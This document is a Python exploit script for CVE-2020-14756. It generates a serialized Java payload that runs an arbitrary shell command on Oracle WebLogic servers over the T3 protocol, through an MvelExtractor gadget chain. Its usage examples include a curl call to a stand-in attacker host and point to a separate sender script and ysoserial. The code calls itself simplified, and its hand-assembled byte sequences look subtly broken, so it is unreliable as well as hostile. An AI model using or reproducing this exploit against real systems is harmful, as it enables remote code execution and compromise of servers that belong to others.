#!/usr/bin/env python3
"""
CVE-2020-14756 - WebLogic T3/IIOP Deserialization Payload Generator

This script generates the serialized Java payload for exploiting
CVE-2020-14756 via the T3 protocol.

Gadget Chain:
  AttributeHolder.readExternal()
    -> ExternalizableHelper.readObject()
      -> TopNAggregator.PartialResult.readExternal()
        -> TreeMap.put()
          -> SortedBag.WrapperComparator.compare()
            -> MvelExtractor.extract()
              -> MVEL expression execution

Usage:
  python3 gen_payload.py <command> [output_file]

Example:
  python3 gen_payload.py "touch /tmp/pwned" payload.bin
  python3 gen_payload.py "curl http://attacker.com/pwned" payload.bin

Author: princechaddha
CVE: CVE-2020-14756
"""

import sys
import struct
import binascii

# T3 Protocol Header
T3_HEADER = b"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://127.0.0.1:7001\n\n"

# Pre-generated serialized payload templates
# These are based on the Y4er CVE-2020-14756 exploit

def create_mvel_extractor_payload(command):
    """
    Create a serialized MvelExtractor payload that executes a command.
    
    The MVEL expression used is:
    java.lang.Runtime.getRuntime().exec("<command>")
    """
    mvel_expression = f'java.lang.Runtime.getRuntime().exec("{command}")'
    
    # This is a simplified representation
    # In reality, you need to use ysoserial or similar to generate the full payload
    
    # Payload structure (hex):
    # - Java serialization magic: aced0005
    # - AttributeHolder class descriptor
    # - TopNAggregator.PartialResult
    # - MvelExtractor with expression
    
    # Base payload prefix (common headers)
    prefix = bytes.fromhex(
        "aced0005"  # Java serialization magic
        "7372"      # TC_OBJECT + TC_CLASSDESC
        "003b636f6d2e74616e676f736f6c2e636f686572656e63652e736572766c65742e417474726962757465486f6c646572"  # class name
        "0000000000000001"  # serialVersionUID
        "0200024900066d5f6e4964784c00076d5f6f41747472"
        "7400124c6a6176612f6c616e672f4f626a6563743b"
        "787000000000"
    )
    
    # TopNAggregator.PartialResult payload
    partial_result = bytes.fromhex(
        "7372"  # TC_OBJECT + TC_CLASSDESC
        "0040636f6d2e74616e676f736f6c2e7574696c2e6167677265676174696f722e546f704e41676772656761746f72245061727469616c526573756c74"
        "0000000000000001"
        "0200014900"
    )
    
    # MvelExtractor payload with command
    mvel_payload = bytes.fromhex(
        "7372"  # TC_OBJECT + TC_CLASSDESC  
        "0039636f6d2e74616e676f736f6c2e636f686572656e63652e726573742e7574696c2e657874726163746f722e4d76656c457874726163746f72"
        "0000000000000001"
        "0200014c00076d5f7345787072"
        "7400124c6a6176612f6c616e672f537472696e673b"
        "7870"
    )
    
    # Add expression string
    expr_bytes = mvel_expression.encode('utf-8')
    expr_length = struct.pack('>H', len(expr_bytes))
    
    return prefix + partial_result + mvel_payload + expr_length + expr_bytes


def create_t3_payload(command, marker="CVE202014756"):
    """
    Create complete T3 protocol payload with the exploit.
    """
    # T3 protocol wrapper
    # This wraps the serialized object in T3 protocol format
    
    inner_payload = create_mvel_extractor_payload(command)
    
    # T3 message structure
    t3_msg = bytes.fromhex(
        "000009f3"  # Length placeholder
        "0165"      # Message type
        "01"        # Protocol version
        "01"        # Flags
        "ffffffffffffffff"  # Context ID
        "00000071"  # Request ID
        "00000018"  # Timeout
        "0000001843c6a2a63985b5af7d63e64383f42a6d92c9e9af0f947202"
        "79737200787201787202787000"
    )
    
    # Combine with payload
    full_payload = t3_msg + inner_payload
    
    # Fix length field
    length = struct.pack('>I', len(full_payload))
    full_payload = length + full_payload[4:]
    
    return full_payload


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <command> [output_file]")
        print(f"Example: python3 {sys.argv[0]} 'touch /tmp/pwned' payload.bin")
        print()
        print("Recommended: Use ysoserial for production payloads")
        print("  java -jar ysoserial.jar Coherence1 'touch /tmp/pwned' > payload.bin")
        sys.exit(1)
    
    command = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "payload.bin"
    
    print("=" * 60)
    print("CVE-2020-14756 Payload Generator")
    print("=" * 60)
    print()
    print(f"Command: {command}")
    print(f"Output:  {output_file}")
    print()
    
    # Generate payload
    payload = create_t3_payload(command)
    
    # Write to file
    with open(output_file, 'wb') as f:
        f.write(payload)
    
    print(f"[+] Payload written to {output_file}")
    print(f"[+] Size: {len(payload)} bytes")
    print(f"[+] MD5: (calculate with md5sum {output_file})")
    print()
    print("Usage with weblogic_t3.py:")
    print(f"  python weblogic_t3.py <target_ip> 7001 {output_file}")
    print()
    print("NOTE: For reliable exploitation, use ysoserial with Coherence1 gadget:")
    print(f"  java -jar ysoserial.jar Coherence1 '{command}' > {output_file}")
    print()


if __name__ == "__main__":
    main()
